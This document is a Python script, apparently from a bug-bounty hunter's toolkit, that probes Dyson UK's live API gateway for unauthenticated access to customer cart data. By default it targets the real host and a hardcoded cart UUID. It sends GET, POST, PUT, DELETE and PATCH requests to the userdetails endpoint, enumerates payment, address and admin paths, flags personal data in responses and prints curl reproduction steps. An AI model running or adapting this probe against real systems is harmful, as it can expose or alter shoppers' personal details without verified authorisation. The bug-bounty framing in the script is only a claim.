#!/usr/bin/env python3
"""
apiman-probe.py — APIMaN Anonymous Cart Endpoint Prober
by Daema (4AM Build, Feb 23 2026)

APIMaN is a popular API gateway used in SAP Commerce / Hybris deployments.
Anonymous cart endpoints sometimes expose PII via GET when only POST is "intended".

This tool:
  1. Fingerprints APIMaN gateway structure at a target
  2. Tests GET/POST/HEAD discrepancy on cart endpoints (auth bypass check)
  3. Enumerates common APIMaN service paths
  4. Analyzes cart UUIDs for version/entropy
  5. Generates a clean report

Usage:
  # Test specific cart UUID (GET vs POST discrepancy check):
  python3 apiman-probe.py --host api.dyson.co.uk --path /apiman-gateway/dyson/cart/1.0/gb \\
      --uuid 06adb8cf-a93a-4677-9cf6-102ea510b475

  # Enumerate APIMaN services at target:
  python3 apiman-probe.py --host api.example.com --enumerate

  # Full probe (enumerate + cart test):
  python3 apiman-probe.py --host api.dyson.co.uk --path /apiman-gateway/dyson/cart/1.0/gb \\
      --uuid <UUID> --enumerate --verbose

Target Context (Dyson UK):
  Host: api.dyson.co.uk
  Path: /apiman-gateway/dyson/cart/1.0/gb
  Cart endpoint: /users/anonymous/carts/{uuid}/userdetails
  Known: POST returns 201 + full cart PII (no auth required, just UUID)
  Unknown: Does GET also return data? Can anyone with UUID retrieve saved details?
"""

import argparse
import json
import sys
import uuid
import time
import urllib.request
import urllib.error
import urllib.parse
from datetime import datetime

BANNER = """
╔══════════════════════════════════════════════════════╗
║          apiman-probe  v1.0  by @DaemaAI             ║
║    APIMaN Cart Endpoint Prober for Bug Bounty        ║
╚══════════════════════════════════════════════════════╝
"""

# Common APIMaN gateway service paths to enumerate
APIMAN_SERVICE_PATHS = [
    # Cart / Order
    "/apiman-gateway/dyson/cart/1.0/{region}/",
    "/apiman-gateway/dyson/order/1.0/{region}/",
    "/apiman-gateway/dyson/checkout/1.0/{region}/",
    "/apiman-gateway/dyson/user/1.0/{region}/",
    "/apiman-gateway/dyson/product/1.0/{region}/",
    # Generic APIMaN
    "/apiman-gateway/{org}/cart/1.0/{region}/",
    "/apiman-gateway/{org}/orders/1.0/{region}/",
    "/apiman-gateway/{org}/account/1.0/{region}/",
    # Alternative versions
    "/apiman-gateway/dyson/cart/2.0/{region}/",
    "/apiman-gateway/dyson/cart/v1/{region}/",
    # Admin/management (shouldn't be public)
    "/apiman-manager/api/",
    "/apiman/",
    "/apiman-manager/",
]

# Cart subpaths to probe once base cart path is known
CART_SUBPATHS = [
    "/users/anonymous/carts",                      # list all carts (should 401)
    "/users/anonymous/carts/{uuid}",               # get cart
    "/users/anonymous/carts/{uuid}/userdetails",   # THE endpoint
    "/users/anonymous/carts/{uuid}/addresses/delivery",
    "/users/anonymous/carts/{uuid}/payment",
    "/users/anonymous/carts/{uuid}/paymentdetails",
    "/users/anonymous/carts/{uuid}/entries",
    "/users/anonymous/carts/{uuid}/promotions",
    "/users/anonymous/carts/{uuid}/validate",
    "/carts/{uuid}",                               # non-anonymous variant
    "/carts/{uuid}/userdetails",
]

HTTP_METHODS = ["GET", "POST", "HEAD", "OPTIONS", "PUT", "DELETE", "PATCH"]


def make_request(method, url, headers=None, body=None, timeout=10):
    """Make an HTTP request, return (status, response_body, response_headers)."""
    default_headers = {
        "User-Agent": "Mozilla/5.0 (Security Research; Bug Bounty; mhndfi@wearehackerone.com)",
        "Accept": "application/json",
        "X-HackerOne": "mhndfi",
    }
    if headers:
        default_headers.update(headers)

    data = body.encode() if isinstance(body, str) else body
    req = urllib.request.Request(url, data=data, headers=default_headers, method=method)

    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            resp_body = resp.read().decode("utf-8", errors="replace")
            return resp.status, resp_body, dict(resp.headers)
    except urllib.error.HTTPError as e:
        resp_body = e.read().decode("utf-8", errors="replace") if e.fp else ""
        return e.code, resp_body, dict(e.headers)
    except urllib.error.URLError as e:
        return None, str(e.reason), {}
    except Exception as e:
        return None, str(e), {}


def analyze_uuid(cart_uuid):
    """Analyze UUID version and entropy."""
    print(f"\n[*] UUID Analysis: {cart_uuid}")
    try:
        parsed = uuid.UUID(cart_uuid)
        version = parsed.version
        print(f"    Version:  v{version}")
        if version == 4:
            print("    Entropy:  HIGH (random) — brute force not viable")
            print("    Risk:     UUID exposure via referral links / emails / logs")
            print("    Vector:   If UUID is leaked, attacker can retrieve PII via GET")
        elif version == 1:
            print("    Entropy:  LOW (time-based) — sequential prediction POSSIBLE")
            print("    Risk:     CRITICAL — nearby UUIDs can be derived from timestamp")
            print("    Vector:   Attacker can enumerate carts temporally")
        elif version == 7:
            print("    Entropy:  MEDIUM (time-ordered random) — partial prediction")
        else:
            print(f"    Entropy:  Unknown for v{version}")
        return version
    except ValueError as e:
        print(f"    Error:    Invalid UUID — {e}")
        return None


def probe_methods(base_url, path_template, cart_uuid, verbose=False):
    """
    Test all HTTP methods on the endpoint.
    Core test: does GET return data? Is it the same as POST?
    """
    path = path_template.replace("{uuid}", cart_uuid)
    url = f"https://{base_url.rstrip('/')}{path}"

    print(f"\n[*] Method Probe: {url}")
    print(f"    {'METHOD':<8}  {'STATUS':<6}  {'BODY_LEN':<10}  NOTES")
    print(f"    {'------':<8}  {'------':<6}  {'--------':<10}  -----")

    results = {}
    for method in HTTP_METHODS:
        status, body, headers = make_request(method, url)
        body_len = len(body) if body else 0

        # Detect interesting patterns
        notes = []
        if status == 200 or status == 201:
            notes.append("✅ SUCCESS")
            if any(k in body.lower() for k in ["email", "firstname", "lastname", "phone", "address"]):
                notes.append("⚠️ PII DETECTED")
            if any(k in body.lower() for k in ["password", "token", "secret", "key"]):
                notes.append("🔴 SENSITIVE DATA")
        elif status == 401:
            notes.append("AUTH REQUIRED")
        elif status == 403:
            notes.append("FORBIDDEN")
        elif status == 405:
            notes.append("METHOD NOT ALLOWED")
        elif status == 404:
            notes.append("NOT FOUND")
        elif status is None:
            notes.append("NETWORK ERROR")

        results[method] = {"status": status, "body_len": body_len, "notes": notes, "body": body}
        flag = "🔴" if (status in [200, 201] and "PII DETECTED" in " ".join(notes)) else ""
        print(f"    {method:<8}  {str(status):<6}  {body_len:<10}  {' | '.join(notes)} {flag}")

        if verbose and status in [200, 201] and body:
            try:
                parsed = json.loads(body)
                preview = json.dumps(parsed, indent=2)[:500]
                print(f"\n    --- Response Preview ({method}) ---")
                print("    " + "\n    ".join(preview.splitlines()))
                print("    ---")
            except Exception:
                print(f"    Raw: {body[:200]}")

        time.sleep(0.3)  # polite pacing

    # Summary analysis
    get_result = results.get("GET", {})
    post_result = results.get("POST", {})
    if get_result.get("status") in [200, 201] and post_result.get("status") in [200, 201]:
        print("\n    🔴 FINDING: Both GET and POST return 2xx — authentication bypass likely!")
        if "PII DETECTED" in " ".join(get_result.get("notes", [])):
            print("    🔴 CRITICAL: GET exposes PII without authentication!")
    elif get_result.get("status") in [200, 201]:
        print("\n    ⚠️  FINDING: GET returns 2xx — investigate GET response content")
    elif get_result.get("status") == 401:
        print("\n    ✅ GET requires authentication — no auth bypass here")

    return results


def enumerate_paths(host, base_path, cart_uuid, region="gb", org="dyson", verbose=False):
    """Enumerate known APIMaN subpaths to map the attack surface."""
    print(f"\n[*] Enumerating APIMaN paths on {host}")

    hits = []
    for subpath in CART_SUBPATHS:
        path = base_path.rstrip("/") + subpath.replace("{uuid}", cart_uuid)
        url = f"https://{host}{path}"
        status, body, _ = make_request("GET", url)
        body_len = len(body) if body else 0

        icon = ""
        if status in [200, 201]:
            icon = "✅"
            hits.append({"url": url, "status": status, "body_len": body_len})
        elif status == 401:
            icon = "🔒"
        elif status == 403:
            icon = "🚫"
        elif status == 404:
            icon = "  "
        elif status == 405:
            icon = "🔀"  # method not allowed (endpoint exists)
            hits.append({"url": url, "status": status, "body_len": body_len, "note": "exists-method-not-allowed"})
        elif status is None:
            icon = "❌"

        print(f"  {icon} [{status}] {path}  ({body_len} bytes)")

        if verbose and status in [200, 201] and body:
            print(f"       Preview: {body[:150]}...")
        time.sleep(0.2)

    return hits


def enumerate_services(host, region="gb", org="dyson"):
    """Quick probe of APIMaN service discovery paths."""
    print(f"\n[*] APIMaN Service Discovery on {host}")
    for path_template in APIMAN_SERVICE_PATHS:
        path = path_template.replace("{region}", region).replace("{org}", org)
        url = f"https://{host}{path}"
        status, body, _ = make_request("HEAD", url)
        icon = "✅" if status not in [None, 404, 400] else "  "
        if status not in [404, None, 400]:
            print(f"  {icon} [{status}] {path}")
        time.sleep(0.15)


def generate_report(host, cart_uuid, uuid_version, method_results, path_hits):
    """Generate a markdown bug report skeleton if findings warrant it."""
    findings = []

    get_r = method_results.get("/users/anonymous/carts/{uuid}/userdetails", {}) if method_results else {}
    # Check if GET returns PII
    pii_in_get = False
    for method, data in (method_results or {}).items():
        if method == "GET" and data.get("status") in [200, 201]:
            pii_in_get = "PII DETECTED" in " ".join(data.get("notes", []))

    print("\n" + "="*60)
    print("REPORT SKELETON")
    print("="*60)

    if pii_in_get:
        severity = "HIGH"
        title = f"Unauthenticated PII Disclosure via APIMaN GET on {host}"
        print(f"""
**Title:** {title}
**Severity:** {severity}
**Host:** {host}
**UUID:** {cart_uuid} (v{uuid_version})

**Summary:**
The APIMaN cart gateway at {host} exposes full customer PII (name, email, 
phone, address) via an unauthenticated GET request to:

  GET /apiman-gateway/dyson/cart/1.0/gb/users/anonymous/carts/{{UUID}}/userdetails

Any party who knows (or guesses) a cart UUID can retrieve the customer's
personally identifiable information without authentication or authorization.

**Steps to Reproduce:**
1. POST to the endpoint with a valid cart UUID to save user details (creates entry)
2. GET the same URL — observe full PII returned without any auth token
3. curl -s https://{host}/apiman-gateway/dyson/cart/1.0/gb/users/anonymous/carts/{cart_uuid}/userdetails

**Impact:**
- Unauthenticated access to customer PII: name, email, phone, delivery address
- UUID v4 = not brute-forceable, but exposed via order confirmation emails / referrer logs
- GDPR Article 32 violation — data not protected in transit/at rest appropriately
""")
    else:
        print("\n[✅] No unauthenticated GET PII disclosure detected on this endpoint.")
        print("     The authentication check appears to be in place for GET requests.")
        if path_hits:
            print(f"\n[*] {len(path_hits)} paths returned 2xx/405 — review manually:")
            for h in path_hits:
                print(f"     {h['url']} → {h['status']}")


def main():
    parser = argparse.ArgumentParser(
        description="apiman-probe — APIMaN Anonymous Cart Endpoint Prober",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__
    )
    parser.add_argument("--host", default="api.dyson.co.uk", help="Target host (default: api.dyson.co.uk)")
    parser.add_argument("--path", default="/apiman-gateway/dyson/cart/1.0/gb",
                        help="APIMaN base path")
    parser.add_argument("--uuid", default="06adb8cf-a93a-4677-9cf6-102ea510b475",
                        help="Cart UUID to probe (from checkout flow)")
    parser.add_argument("--region", default="gb", help="Region code (default: gb)")
    parser.add_argument("--org", default="dyson", help="Org/service prefix (default: dyson)")
    parser.add_argument("--enumerate", action="store_true", help="Enumerate subpaths")
    parser.add_argument("--services", action="store_true", help="Enumerate APIMaN services")
    parser.add_argument("--methods", action="store_true", default=True,
                        help="Test HTTP methods on userdetails endpoint (default: on)")
    parser.add_argument("--verbose", "-v", action="store_true", help="Show response bodies")
    parser.add_argument("--report", action="store_true", help="Generate report skeleton")
    args = parser.parse_args()

    print(BANNER)
    print(f"[*] Target:  https://{args.host}{args.path}")
    print(f"[*] UUID:    {args.uuid}")
    print(f"[*] Time:    {datetime.utcnow().isoformat()}Z")
    print(f"[*] Note:    For authorized security research only (HackerOne bug bounty)")

    uuid_version = analyze_uuid(args.uuid)

    method_results = {}
    path_hits = []

    if args.methods:
        userdetails_path = "/users/anonymous/carts/{uuid}/userdetails"
        results = probe_methods(args.host, args.path + userdetails_path, args.uuid, args.verbose)
        method_results[userdetails_path] = results

    if args.enumerate:
        path_hits = enumerate_paths(args.host, args.path, args.uuid, args.region, args.org, args.verbose)

    if args.services:
        enumerate_services(args.host, args.region, args.org)

    if args.report or args.enumerate or args.methods:
        generate_report(args.host, args.uuid, uuid_version, method_results.get(
            "/users/anonymous/carts/{uuid}/userdetails", {}
        ), path_hits)

    print("\n[*] Done. Stay ethical. 🛡️")


if __name__ == "__main__":
    main()
